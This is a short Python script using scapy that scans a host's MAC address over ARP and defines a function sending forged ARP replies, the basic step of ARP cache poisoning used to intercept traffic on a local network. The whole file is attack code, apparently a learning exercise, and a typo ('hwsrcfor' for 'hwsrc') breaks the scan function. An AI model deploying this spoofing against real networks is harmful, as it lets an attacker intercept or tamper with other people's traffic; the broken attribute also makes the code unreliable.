#!/usr/bin/env python
import scapy.all as scapy

def scan(IP):
    arp_request = scapy.ARP(pdst=IP)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')   
    arp_request_broadcast = broadcast/arp_request
    answered, _ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
    return answered[0][1].hwsrcfor

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scan(target_ip), psrc=spoof_ip)
    packet.show()
    packet.summary()
    scapy.send(packet)

print(scan('10.20.3.134'))